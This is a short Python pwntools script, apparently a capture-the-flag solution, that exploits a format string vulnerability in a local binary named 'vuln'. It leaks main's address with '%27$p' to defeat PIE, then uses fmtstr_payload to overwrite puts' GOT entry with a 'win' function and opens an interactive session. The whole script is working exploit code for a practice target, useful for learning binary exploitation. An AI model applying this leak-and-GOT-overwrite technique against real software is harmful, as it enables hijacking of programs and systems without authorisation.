from pwn import *

context.arch = "amd64"
e = ELF("vuln")
#io = gdb.debug("./vuln", "b main \nc")
io = process("vuln")
# eat first line 
io.recvline()

io.sendline(b"%27$p") # leak main's address

addr = int(io.recvline(), 16) # grab the leak
print(hex(addr))
e.address = addr - e.symbols["main"] # calculate the base address

win = e.symbols["win"] 
puts_got = e.got["puts"]

writes = {puts_got : win}
print(writes)
payload = fmtstr_payload(6, writes, numbwritten=0, write_size='byte')

print(len(payload))
io.sendline(payload)
io.interactive()
